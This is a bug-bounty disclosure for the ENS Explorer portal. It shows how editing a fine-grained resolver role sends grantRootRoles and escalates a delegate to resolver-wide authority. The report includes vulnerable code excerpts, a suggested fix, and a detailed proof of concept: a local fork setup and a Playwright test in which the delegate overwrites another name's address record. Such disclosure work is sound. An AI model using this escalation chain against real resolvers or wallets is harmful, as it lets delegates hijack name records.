# 90363 w a critical editing a fine grained resolver role silently grants root wide authority

## #90363 \[W\&A-Critical] Editing a Fine-Grained Resolver Role Silently Grants Root-Wide Authority

**Submitted on Aug 24th 2026 at 17:19:39 UTC by @v\_c0d35 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90363
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

### Description

## Editing a fine-grained resolver role silently grants root-wide authority

### Brief/Intro

At competition commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, Explorer loses the resource scope of an officially supported text-key- or coin-type-scoped resolver role. When an owner edits that delegate's row, the missing scope becomes an empty name, and Explorer converts the requested role addition into `grantRootRoles`. A delegate who began with permission over one record part can consequently receive the added role across every resource on that PermissionedResolver.

### Vulnerability Details

ENSv2 PermissionedResolver roles support root, name, and finer part scopes. For example, a text role may be scoped to the `url` key of one name, and an address role may be scoped to one coin type. The [ENSv2 Permissioned Resolver documentation](https://docs.ens.domains/ensv2/permissioned-resolver/) describes this hierarchy and the root permission's authority over every resource.

Explorer obtains each role's account, resource hash, and bitmap through the production resolver-overview query in [`apps/portal/src/features/resolver/hooks/useResolverOverview.ts:60-118`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/hooks/useResolverOverview.ts#L60-L118). It then builds a resource-to-name lookup in [`apps/portal/src/lib/roles/resolverRoles.ts:129-160`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L129-L160):

```ts
export const computeNameResource = (name: string): string =>
  keccak256(
    encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
  )

export const buildResourceToNameMap = (
  nodes: readonly { readonly name: string }[],
): Map<string, string> => {
  const map = new Map<string, string>()
  map.set(ROOT_RESOURCE, '(root)')

  for (const node of nodes) {
    if (node.name) {
      map.set(computeNameResource(node.name).toLowerCase(), node.name)
    }
  }
  return map
}
```

This map recognizes only the root resource and whole-name resources computed with a zero part. A supported text-key resource uses the text-key hash as its part, and a supported address resource uses the coin-type hash. Neither can match the whole-name entry.

[`groupRolesByAccount`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220) preserves the role bitmap but omits the name whenever this lookup fails:

```ts
const decoded = decodeResolverRoleBitmap(role.roleBitmap)
const resolvedName = resourceToName?.get(resource) ?? null

// ...

const names = new Set<string>()
if (resolvedName) names.add(resolvedName)
```

The resulting row contains the delegate and decoded role but an empty `resolvedNames` array. In [`ResolverRolesSidebar.tsx:165-170`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L170), Explorer converts that state to an empty string:

> See Explorer roles table showing the delegate's Set Address permission with a blank Name column screenshot attached — Explorer's production roles table renders the fine-grained `Set Address` permission for `0x7099…79c8`, while the Name column is blank. The root-scoped rows above it are explicitly labeled `(root)`. This capture uses the competition commit against a disposable Sepolia fork and the genuine Panoptes indexing path.

```ts
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

> See Explorer role editor showing no name or resource scope for the fine-grained delegate screenshot attached — Opening that delegate's actual role editor displays the permission controls without any `Roles scoped to ...` label. The existing `Set Address` permission is checked, but the fine-grained resource that produced it is absent from the owner-facing confirmation context.

When the owner selects an additional permission and clicks **Save**, [`handleSaveChanges`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L295-L304) stores this empty `roleName` in the pending action. The transaction modal forwards it through the production submission path in [`ResolverRolesSidebar.tsx:467-501`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L467-L501).

The final scope conversion occurs in [`prepareGrantResolverRolesTransaction`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts#L29-L75):

```ts
const writeParams = grantResolverRolesWriteParameters(
  walletClient,
  name === ''
    ? {
        resolverAddress,
        targetAccount: account,
        scope: 'root',
        roles,
      }
    : {
        resolverAddress,
        targetAccount: account,
        scope: 'name',
        name,
        roles,
      },
)
```

The empty string produced by an unresolved fine-grained resource is therefore interpreted as an explicit root scope. In the reproduced role edit, the owner intended to add address permission to the displayed delegate row, but the generated transaction decoded to:

```
grantRootRoles(ROLE_SET_ADDR, delegate)
```

The reproduction covers both the production precondition and the terminal contract state change. The companion `resolver-part-indexer-precondition.test.ts` creates a genuine V2 name, grants an address-part permission through the supported ENSjs API, waits for the real Panoptes indexer and API to ingest it, calls Explorer's exact `getResolverOverviewQueryOptions`, and passes only the returned role and node data into `groupRolesByAccount`. The resulting production row retains `ROLE_SET_ADDR` while `resolvedNames` is empty.

The terminal `resolver-part-resource-root-escalation.test.ts` renders the actual sidebar and transaction modal and uses the production transaction helpers. It starts the delegate with only `ROLE_SET_TEXT` for the `url` key of `target.eth` and proves that a `setAddr` call for another node reverts. The owner then adds address permission through Explorer. The test decodes the submitted transaction as `grantRootRoles(ROLE_SET_ADDR, delegate)`, mines it against the byte-for-byte runtime of the deployed Sepolia PermissionedResolver implementation, and confirms `hasRootRoles(ROLE_SET_ADDR, delegate)`. The delegate's same cross-scope `setAddr` then succeeds and the resolver stores the delegate-selected address for the other node. After the owner revokes the root role, a subsequent delegate write reverts and the owner's restored value remains unchanged.

The safe fix is to preserve scope as structured data from the query result through the sidebar and transaction builder. Root, name, text-key, coin-type, and unresolved resources should be distinct states. Explorer should dispatch to the matching fine-grained ENSjs operation and reject edits for resources whose part cannot be reconstructed. `grantRootRoles` should be reachable only from an explicit root-role action.

### Impact Details

An ordinary edit to a fine-grained delegate row can change the transaction's authorization scope from one record part to the entire resolver. The owner approves a root grant for the newly selected role even though the row originated from a part-scoped permission.

For `ROLE_SET_ADDR`, the resulting authority permits the delegate to execute address-record changes for other nodes handled by that PermissionedResolver. The terminal reproduction proves this boundary directly: the other-node `setAddr` transaction fails before the Explorer-generated grant, succeeds after the mined root grant, and fails again after root revocation. The stored record changes to the delegate-selected address while the unintended root role is active.

The affected set is determined by the resolver's own resources. Every node administered by the same PermissionedResolver falls within the accidentally granted root role, rather than only the original name and record part chosen when the delegate was configured.

### References

* [Competition repository at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae)
* [ENSv2 Permissioned Resolver documentation](https://docs.ens.domains/ensv2/permissioned-resolver/)
* [`useResolverOverview.ts:60-118`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/hooks/useResolverOverview.ts#L60-L118)
* [`resolverRoles.ts:129-220`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L129-L220)
* [`ResolverRolesSidebar.tsx:165-170`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L170)
* [`ResolverRolesSidebar.tsx:295-304`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L295-L304)
* [`grantResolverRoles.ts:29-75`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts#L29-L75)

### Proof of Concept

This guide reproduces the issue from a clean checkout of competition commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. It runs Explorer in a real Chromium browser against a disposable Sepolia fork and the genuine Panoptes indexer/API.

The Playwright test performs the entire vulnerable flow:

{% stepper %}
{% step %}

### Register and configure names

It registers two real V2 `.eth` names and points both names to the same deployed PermissionedResolver.
{% endstep %}

{% step %}

### Grant a fine-grained role

It grants a delegate only the supported `url` text-key permission for the first name.
{% endstep %}

{% step %}

### Verify the initial boundary

It proves the delegate cannot change the second name's ETH address.
{% endstep %}

{% step %}

### Wait for indexing

It waits until Panoptes returns the fine-grained role to Explorer.
{% endstep %}

{% step %}

### Edit the role in Explorer

It connects the owner wallet, opens Explorer's real resolver Roles page, clicks the delegate row, selects **Set Address**, clicks **Save**, starts the transaction and approves it.
{% endstep %}

{% step %}

### Decode the submitted transaction

It locates the mined transaction produced by those clicks and decodes it as `grantRootRoles(ROLE_SET_ADDR, delegate)`.
{% endstep %}

{% step %}

### Verify root authority

It proves the delegate now has root address authority and successfully changes the second registered name's ETH address.
{% endstep %}
{% endstepper %}

The test attaches screenshots of the role editor and Explorer transaction confirmation to the Playwright result. All transactions remain on the local fork.

### Prerequisites

* Git
* Node.js 24
* Corepack
* Docker
* Foundry's `cast` command is useful for optional manual inspection

{% stepper %}
{% step %}

### Check out the assessed revision

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack enable
pnpm install --frozen-lockfile
pnpm --filter @ens-apps/e2e exec playwright install chromium
```

{% endstep %}

{% step %}

### Save the local fork configuration

Create a directory named `resolver-poc` in the repository root.

Save the following file as `resolver-poc/contracts.json`:

```json
{
  "_comment": "Minimal ENSv2 Sepolia configuration for the reproduction stack",
  "temporary_registrar": "0x0000000000000000000000000000000000000000",
  "old_ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "old_public_resolver": "0x0000000000000000000000000000000000000000",
  "ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "base_registrar": "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85",
  "eth_registrar_controller": "0xfb3ce5d01e0f33f41dbb39035db9745962f1f968",
  "public_resolver": "0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5",
  "reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "name_wrapper": "0x0635513f179D50A207757E05759CbD106d7dFcE8",
  "root_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "eth_reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "l2_eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "l2_eth_registrar": "0xa88553F454b77203B0D036A05c894d555EAAa2Cc",
  "l2_registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "migration_helper": "0x0000000000000000000000000000000000000000",
  "locked_migration_controller": "0x0000000000000000000000000000000000000000",
  "unlocked_migration_controller": "0x0000000000000000000000000000000000000000",
  "v1_deployment_block": 11550775,
  "l1_deployment_block": 11550775,
  "l2_deployment_block": 11550775,
  "temp_registrar_start_block": 11550775,
  "v1_migration_block": 11550775,
  "name_wrapper_deployment_block": 11550775
}
```

Save the following file as `resolver-poc/docker-compose.yml`:

```yaml
services:
  anvil:
    image: ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd
    entrypoint: ["anvil"]
    command:
      - --fork-url
      - ${SEPOLIA_FORK_URL:-https://ethereum-sepolia-rpc.publicnode.com}
      - --fork-block-number
      - "11550775"
      - --chain-id
      - "11155111"
      - --port
      - "8545"
      - --host
      - "0.0.0.0"
    ports:
      - "28545:8545"
    healthcheck:
      test: ["CMD", "cast", "rpc", "eth_chainId"]
      interval: 2s
      timeout: 10s
      retries: 20

  panoptes-indexer:
    image: ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b
    command: ["/app/ensv2-indexer-v2"]
    volumes:
      - panoptes-data:/app/data
      - ./contracts.json:/app/config/contracts.json:ro
    environment:
      DATABASE_PATH: /app/data/ens_v2.db
      RAINBOW_PATH: /app/data/ens_rainbow.db
      RPC_URL: http://anvil:8545
      NETWORK: sepolia
      CONTRACTS_PATH: /app/config/contracts.json
      BATCH_SIZE: "10000"
      POLL_INTERVAL: "1"
      RATE_LIMIT_PER_SECOND: "100"
      STATUS_PORT: "3001"
      WEBHOOKS_ENABLED: "false"
    depends_on:
      anvil:
        condition: service_healthy

  panoptes-api:
    image: ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b
    command: ["/app/api-entrypoint.sh"]
    ports:
      - "25655:5655"
    volumes:
      - panoptes-data:/app/data:ro
      - ./contracts.json:/app/config/contracts.json:ro
    environment:
      DATABASE_PATH: /app/data/ens_v2.db
      RAINBOW_PATH: /app/data/ens_rainbow.db
      DOWNLOAD_RAINBOW: "false"
      NETWORK: sepolia
      CONTRACTS_PATH: /app/config/contracts.json
      RPC_URL: http://anvil:8545
      API_PORT: "5655"
      GRAPHQL_MAX_DEPTH: "10"
      GRAPHQL_MAX_COST: "1000"
      WEBHOOKS_ENABLED: "false"
      METRICS_ENABLED: "false"
    depends_on:
      - panoptes-indexer

volumes:
  panoptes-data:
```

{% endstep %}

{% step %}

### Start the disposable fork and genuine Panoptes services

From the repository root, run:

```sh
docker compose \
  -p resolver-root-escalation \
  -f resolver-poc/docker-compose.yml \
  up -d
```

Wait until Anvil is healthy:

```sh
docker compose \
  -p resolver-root-escalation \
  -f resolver-poc/docker-compose.yml \
  ps
```

The local endpoints are:

* Anvil Sepolia fork: `http://127.0.0.1:28545`
* Panoptes GraphQL API: `http://127.0.0.1:25655/graphql`

If the public Sepolia endpoint is unavailable, set `SEPOLIA_FORK_URL` to another Sepolia RPC URL before running `docker compose up`.
{% endstep %}

{% step %}

### Save the browser-driven test

Save the following file as `e2e/projects/portal/tests/resolverPartRootEscalation.spec.ts`:

```typescript
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getResolver } from '@ensdomains/ensjs/public'
import {
  grantResolverRolesWriteParameters,
  setResolverWriteParameters,
} from '@ensdomains/ensjs/wallet/v2'
import { permissionedResolverGrantRootRolesSnippet } from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  type Address,
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  type Hex,
  http,
  namehash,
  parseAbi,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { createMakeV2Name } from '../../../fixtures/makeV2Name.js'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient } from '../../../helpers/anvil-client.js'
import { authorizeTransaction } from '../../../helpers/portal-auth.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://localhost:3001'
const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const INDEXER_GRAPHQL_URL =
  process.env.INDEXER_GRAPHQL_URL ?? 'http://127.0.0.1:5655/graphql'

const ROLE_SET_ADDR = 1n
const ENS_REGISTRY =
  ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

const resolverAbi = parseAbi([
  'function hasRootRoles(uint256 roleBitmap,address account) view returns (bool)',
  'function addr(bytes32 node,uint256 coinType) view returns (bytes)',
])
const setAddrAbi = parseAbi([
  'function setAddr(bytes32 node,uint256 coinType,bytes value)',
])

test.use({ viewport: { width: 1440, height: 1100 } })

type IndexedResolver = {
  readonly nodes: readonly { readonly name: string }[]
  readonly roles: readonly {
    readonly account: string
    readonly resource: string
    readonly roleBitmap: string
  }[]
}

async function waitForPanoptes(
  resolverAddress: Address,
  delegate: Address,
  names: readonly string[],
): Promise<IndexedResolver> {
  const query = `
    query ResolverRolePrecondition($id: String!) {
      resolver(id: $id) {
        nodes { name }
        roles { account resource roleBitmap }
      }
    }
  `

  const deadline = Date.now() + 120_000
  while (Date.now() < deadline) {
    const response = await fetch(INDEXER_GRAPHQL_URL, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        query,
        variables: { id: resolverAddress.toLowerCase() },
      }),
    })
    if (response.ok) {
      const body = (await response.json()) as {
        readonly data?: { readonly resolver?: IndexedResolver | null }
      }
      const resolver = body.data?.resolver
      if (
        resolver &&
        names.every((name) =>
          resolver.nodes.some((node) => node.name === name),
        ) &&
        resolver.roles.some(
          (role) => role.account.toLowerCase() === delegate.toLowerCase(),
        )
      ) {
        return resolver
      }
    }
    await new Promise((resolve) => setTimeout(resolve, 500))
  }
  throw new Error('Panoptes did not index the resolver role precondition')
}

async function findUiGrant(
  resolverAddress: Address,
  owner: Address,
  firstBlock: bigint,
): Promise<Hex> {
  const lastBlock = await publicClient.getBlockNumber({ cacheTime: 0 })
  for (let blockNumber = firstBlock; blockNumber <= lastBlock; blockNumber++) {
    const block = await publicClient.getBlock({
      blockNumber,
      includeTransactions: true,
    })
    for (const transaction of block.transactions) {
      if (
        typeof transaction !== 'string' &&
        transaction.from.toLowerCase() === owner.toLowerCase() &&
        transaction.to?.toLowerCase() === resolverAddress.toLowerCase()
      ) {
        try {
          const decoded = decodeFunctionData({
            abi: permissionedResolverGrantRootRolesSnippet,
            data: transaction.input,
          })
          if (decoded.functionName === 'grantRootRoles') {
            return transaction.input
          }
        } catch {
          // This owner may have sent another resolver transaction in the block.
        }
      }
    }
  }
  throw new Error(
    'The Explorer-generated grantRootRoles transaction was not mined',
  )
}

test('editing a fine-grained role through Explorer grants root authority', async ({
  portalPage: page,
  wallet,
  accounts,
}, testInfo) => {
  test.setTimeout(240_000)

  const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
  const delegate = privateKeyToAccount(accounts.getPrivateKey('user2'))
  const transport = http(ANVIL_RPC_URL)
  const ownerWallet = createWalletClient({
    account: owner,
    chain: sepolia,
    transport,
  })
  const delegateWallet = createWalletClient({
    account: delegate,
    chain: sepolia,
    transport,
  })

  await connectWithHeadlessWallet(page, wallet)

  const makeV2Name = createMakeV2Name({ userAccount: owner })
  const targetName = await makeV2Name({ label: 'fine-role-target' })
  const otherName = await makeV2Name({ label: 'fine-role-other' })
  const resolverAddress = await getResolver(publicClient, { name: targetName })
  if (!resolverAddress) throw new Error('Target name has no resolver')

  // Make the second registered name use the same PermissionedResolver. This
  // turns the scope error into an observable write across two real V2 names.
  const otherLabel = otherName.slice(0, -'.eth'.length)
  const setResolver = setResolverWriteParameters(ownerWallet, {
    label: otherLabel,
    registryAddress: ENS_REGISTRY,
    resolverAddress,
  })
  const setResolverHash = await ownerWallet.sendTransaction({
    to: setResolver.address,
    data: encodeFunctionData(
      setResolver as Parameters<typeof encodeFunctionData>[0],
    ),
  })
  await publicClient.waitForTransactionReceipt({ hash: setResolverHash })
  expect(await getResolver(publicClient, { name: otherName })).toBe(
    resolverAddress,
  )

  // Give the delegate only the supported `url` text-key permission for the
  // first name. Panoptes returns this fine-grained resource to Explorer.
  const limitedGrant = grantResolverRolesWriteParameters(ownerWallet, {
    resolverAddress,
    targetAccount: delegate.address,
    scope: 'text',
    name: targetName,
    key: 'url',
  })
  const limitedGrantHash = await ownerWallet.sendTransaction({
    to: limitedGrant.address,
    data: encodeFunctionData(
      limitedGrant as Parameters<typeof encodeFunctionData>[0],
    ),
  })
  await publicClient.waitForTransactionReceipt({ hash: limitedGrantHash })

  const otherNode = namehash(otherName)
  const maliciousAddress = delegate.address.toLowerCase() as Hex
  const crossNameWrite = encodeFunctionData({
    abi: setAddrAbi,
    functionName: 'setAddr',
    args: [otherNode, 60n, maliciousAddress],
  })

  // Negative control: the fine-grained text role cannot change another
  // name's ETH address before the owner uses Explorer.
  await expect(
    publicClient.call({
      account: delegate.address,
      to: resolverAddress,
      data: crossNameWrite,
    }),
  ).rejects.toThrow()

  const indexed = await waitForPanoptes(resolverAddress, delegate.address, [
    targetName,
    otherName,
  ])
  const indexedDelegateRole = indexed.roles.find(
    (role) => role.account.toLowerCase() === delegate.address.toLowerCase(),
  )
  if (!indexedDelegateRole) throw new Error('Delegate role was not indexed')
  expect(BigInt(indexedDelegateRole.roleBitmap)).toBe(16n)

  await page.goto(`${PORTAL_APP_URL}/resolver/${resolverAddress}/roles`)
  const shortDelegate = `${delegate.address.slice(0, 6)}…${delegate.address.slice(-4)}`
  const delegateRow = page.getByRole('row', {
    name: new RegExp(shortDelegate, 'i'),
  })
  await expect(delegateRow).toBeVisible({ timeout: 30_000 })
  await expect(delegateRow).toContainText('Set Text')
  await expect(delegateRow.getByRole('cell').nth(1)).toHaveText('')

  await delegateRow.hover()
  await delegateRow.getByRole('button', { name: 'Edit user roles' }).click()
  const editor = page.getByRole('dialog').filter({ hasText: shortDelegate })
  await expect(editor).toBeVisible()
  await expect(editor.getByText(/Roles scoped to/)).toHaveCount(0)
  await page.waitForTimeout(500)
  const editorScreenshot = testInfo.outputPath('fine-grained-role-editor.png')
  await page.screenshot({ path: editorScreenshot })
  await testInfo.attach('fine-grained-role-editor', {
    path: editorScreenshot,
    contentType: 'image/png',
  })

  // This is the user action under test: add Set Address to the displayed
  // fine-grained row, then accept Explorer's transaction flow.
  await editor.locator('#ROLE_SET_ADDR-manager').click()
  await editor.getByRole('button', { name: 'Save' }).click()

  const transactionDialog = page
    .getByRole('dialog')
    .filter({ hasText: 'Save resolver role changes' })
  await expect(transactionDialog).toBeVisible()
  await transactionDialog
    .getByRole('button', { name: 'Start', exact: true })
    .click()
  await expect(
    transactionDialog.getByText(
      new RegExp(`Update roles for ${delegate.address}`, 'i'),
    ),
  ).toBeVisible()
  const confirmationScreenshot = testInfo.outputPath(
    'explorer-transaction-confirmation.png',
  )
  await page.screenshot({ path: confirmationScreenshot })
  await testInfo.attach('explorer-transaction-confirmation', {
    path: confirmationScreenshot,
    contentType: 'image/png',
  })

  const firstUiBlock = await publicClient.getBlockNumber({ cacheTime: 0 })
  await Promise.all([
    authorizeTransaction(wallet),
    transactionDialog.getByRole('button', { name: 'Open wallet' }).click(),
  ])

  await expect
    .poll(
      () =>
        publicClient.readContract({
          address: resolverAddress,
          abi: resolverAbi,
          functionName: 'hasRootRoles',
          args: [ROLE_SET_ADDR, delegate.address],
        }),
      { timeout: 60_000 },
    )
    .toBe(true)

  const uiGrantData = await findUiGrant(
    resolverAddress,
    owner.address,
    firstUiBlock,
  )
  expect(
    decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: uiGrantData,
    }),
  ).toEqual({
    functionName: 'grantRootRoles',
    args: [ROLE_SET_ADDR, delegate.address],
  })

  await expect(
    transactionDialog.getByRole('button', { name: 'Done' }),
  ).toBeVisible({ timeout: 30_000 })
  await transactionDialog.getByRole('button', { name: 'Done' }).click()

  // Positive control: the same write now succeeds on the second registered
  // name because the Explorer transaction granted resolver-root authority.
  const attackHash = await delegateWallet.sendTransaction({
    to: resolverAddress,
    data: crossNameWrite,
  })
  const attackReceipt = await publicClient.waitForTransactionReceipt({
    hash: attackHash,
  })
  expect(attackReceipt.status).toBe('success')
  expect(
    await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'addr',
      args: [otherNode, 60n],
    }),
  ).toBe(maliciousAddress)
})
```

{% endstep %}

{% step %}

### Start Explorer

In a first terminal, from the repository root, run:

```sh
VITE_SEPOLIA_RPC_URL=http://127.0.0.1:28545 \
VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:25655/graphql \
pnpm --filter portal dev --host 127.0.0.1 --port 3001
```

Leave this process running.
{% endstep %}

{% step %}

### Run the end-to-end proof

In a second terminal, from the repository root, run:

```sh
ANVIL_RPC_URL=http://127.0.0.1:28545 \
INDEXER_GRAPHQL_URL=http://127.0.0.1:25655/graphql \
PORTAL_APP_URL=http://127.0.0.1:3001 \
pnpm --filter @ens-apps/e2e exec playwright test \
  --config=projects/portal/playwright.config.ts \
  resolverPartRootEscalation.spec.ts \
  --workers=1
```

A successful run ends with output equivalent to:

```
✓ editing a fine-grained role through Explorer grants root authority
1 passed
```

The passing assertions establish the complete chain from genuine indexed state, through actual Explorer clicks and wallet approval, to the mined root-role grant and the delegate's successful cross-name record change.
{% endstep %}

{% step %}

### Optional: inspect the visual artifacts

The test attaches:

* `fine-grained-role-editor`: the real Explorer editor showing no resource-scope label.
* `explorer-transaction-confirmation`: the real Explorer transaction flow immediately before wallet approval.

Playwright stores attachments under `test-results/` for the test run.
{% endstep %}

{% step %}

### Stop and remove the disposable environment

```sh
docker compose \
  -p resolver-root-escalation \
  -f resolver-poc/docker-compose.yml \
  down -v
```

{% endstep %}
{% endstepper %}
